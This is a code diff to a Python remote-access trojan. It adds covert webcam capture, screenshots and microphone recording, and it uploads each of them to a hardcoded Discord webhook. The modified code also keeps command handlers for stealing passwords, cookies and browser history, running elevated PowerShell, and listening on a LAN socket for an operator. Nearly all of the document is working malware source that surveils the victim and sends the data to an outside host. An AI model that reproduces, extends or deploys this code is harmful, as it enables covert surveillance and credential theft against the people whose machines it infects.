@@ -1,4 +1,4 @@
-import socket, os, cv2, pyautogui, subprocess, ctypes, sys, shutil, webbrowser, time, requests,pynput, pyperclip, sqlite3, base64, json
+import socket, os, cv2, pyautogui, subprocess, ctypes, sys, shutil, webbrowser, time, requests,pynput, pyperclip, sqlite3, base64, json, pyaudio, wave
 
 from datetime import datetime, timedelta
 
@@ -253,28 +253,79 @@ class Functions:
         self.dizin = os.getcwd()
 
         return self.dizin
-    def capture_camera(self):
+    def capture_camera(self, webhook_url):
         self.camera = cv2.VideoCapture(0)
 
         self.ret, self.frame = self.camera.read()
 
         if self.ret:
-            cv2.imwrite("photo.jpg", self.frame)
-            return f"{Fore.GREEN}Succsessfully the taked photo!{Fore.RESET}"
+            self.kamera = cv2.imwrite("photo.jpg", self.frame)
+            self.response = requests.post(webhook_url, files=self.kamera)
+            if self.response.status_code == 200:
+                return f"{Fore.GREEN}Succsessfully the taked photo!{Fore.RESET}"
+            else:
+                return f"{Fore.RED}Can't sent the yout webhook url!"
         else:
             return f"{Fore.RED}Error! Failed the capture photo!{Fore.RESET}"
 
         self.camera.release()
 
-    def take_screenshot(self):
+    def take_screenshot(self, webhook_url):
         try:
             self.screenshot = pyautogui.screenshot("error.png")
-            return f"{Fore.GREEN}Succsesfully taked screenshot!{Fore.RESET}"
+            self.response = requests.post(webhook_url, files=self.screenshot)
+            if self.response.status_code == 200:
+                return f"{Fore.GREEN}Succsesfully taked screenshot!{Fore.RESET}"
+            else:
+                return f"{Fore.RED}Can't sent the screenshoot with your webhook"
+
         except Exception as e:
             return f"{Fore.RED}Error! {e}{Fore.RESET}"
 
-    def voice(self):
-        return f"{Fore.GREEN}Succsesfully taked screenshot!{Fore.RESET}"
+    def voice(self, webhook_url):
+        FORMAT = pyaudio.paInt16
+        CHANNELS = 1
+        RATE = 44100
+        CHUNK = 1024
+        RECORD_SECONDS = 5
+        WAVE_OUTPUT_FILENAME = "output.wav"
+
+        audio = pyaudio.PyAudio()
+
+        stream = audio.open(format=FORMAT,
+                            channels=CHANNELS,
+                            rate=RATE,
+                            input=True,
+                            frames_per_buffer=CHUNK)
+
+        frames = []
+
+        for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
+            data = stream.read(CHUNK)
+            frames.append(data)
+
+        stream.stop_stream()
+        stream.close()
+        audio.terminate()
+
+        with wave.open(WAVE_OUTPUT_FILENAME, 'wb') as wf:
+            wf.setnchannels(CHANNELS)
+            wf.setsampwidth(audio.get_sample_size(FORMAT))
+            wf.setframerate(RATE)
+            wf.writeframes(b''.join(frames))
+
+        ses = b''.join(frames)
+
+        webhook_url = webhook_url
+
+        with open(WAVE_OUTPUT_FILENAME, 'rb') as file:
+            files = {'file': (WAVE_OUTPUT_FILENAME, file, 'audio/wav')}
+            response = requests.post(webhook_url, files=files)
+
+        if response.status_code == 200:
+            return f"{Fore.GREEN}Succsesfully taked screenshot!{Fore.RESET}"
+        else:
+            return f"{Fore.RED}Can't sent the voice your webhook url{Fore.RESET}"
 
     def steal_password(self, data):
         try:
@@ -282,9 +333,9 @@ class Functions:
         except Exception as e:
             return f"{Fore.RED}Error! {e}{Fore.RESET}"
 
-    def steal_cookie(self):
+    def steal_cookie(self, webhook_url):
         try:
-            return cookie()
+            return cookie(webhook_url)
         except Exception as e:
             return f"{Fore.RED}Error! {e}{Fore.RESET}"
 
@@ -420,7 +471,7 @@ class Functions:
 
     def admin_shell(self, data):
         try:
-            if ctypes.windll.shell32.IsUserAnAdmin():
+            if ctypes.windll.shell32.IsUserAnAdmin() == True:
                 self.admin_shell = subprocess.run(['runas', '/user:Administrator', 'powershell', '-Command', data],capture_output=True, text=True)
                 return f"{self.admin_shell}"
             else:
@@ -567,10 +618,11 @@ Functions = Functions()
 
 class Main:
     webhook = "https://discord.com/api/webhooks/1217526873932824597/r0HTVunZExlyg672N1vE4kD9gm77dbj7qtACVtd_Rs8dKidl0sLLcM5Ip9Y6BNg_a5Ly"
-    host = "localhost"
-    port = 9999
+    host = "192.168.1.38"
+    port = 4566
 
-    message = f"{host} : {port} listening!"
+    computer_name = socket.gethostname()
+    message = f"{computer_name} is {host} : {port} listening!"
 
     payload = {
         "content": message
@@ -626,8 +678,13 @@ class Main:
                     elif data == "pwd":
                         conn.send(f"{Functions.dizin()}".encode())
 
-                    elif data == "cp":
+                    elif data.startswith("cp "):
+                        data = data[3:]
                         conn.send(f"{Functions.capture_camera()}".encode())
+                        
+                    elif data.startswith("camera "):
+                        data = data[7:]
+                        conn.send(f"{Functions.capture_camera(data)}".encode())
 
                     elif data.startswith("pw "):
                         data = data[3:]
@@ -637,14 +694,25 @@ class Main:
                         data = data[9:]
                         conn.send(f"{Functions.steal_password(data)}".encode())
 
-                    elif data == "cookie":
-                        conn.send(f"{Functions.steal_cookie()}".encode())
+                    elif data.startswith("cookie "):
+                        data = data[7:]
+                        conn.send(f"{Functions.steal_cookie(data)}".encode())
 
-                    elif data == "ss" or data == "screenshot":
-                        conn.send(f"{Functions.take_screenshot()}".encode())
+                    elif data.startswith("ss "):
+                        data = data[3:]
+                        conn.send(f"{Functions.take_screenshot(webhook)}".encode())
 
-                    elif data == "cv" or data == "voice":
-                        conn.send(f"{Functions.voice()}".encode())
+                    elif data.startswith("screenshoot "):
+                        data = data[12:]
+                        conn.send(f"{Functions.take_screenshot(webhook)}".encode())
+
+                    elif data.startswith("vc "):
+                        data = data[3:]
+                        conn.send(f"{Functions.voice(data)}".encode())
+
+                    elif data.startswith("voice "):
+                        data = data[6:]
+                        conn.send(f"{Functions.voice(data)}".encode())
 
                     elif data == "history":
                         conn.send(f"{Functions.steal_history()}".encode())
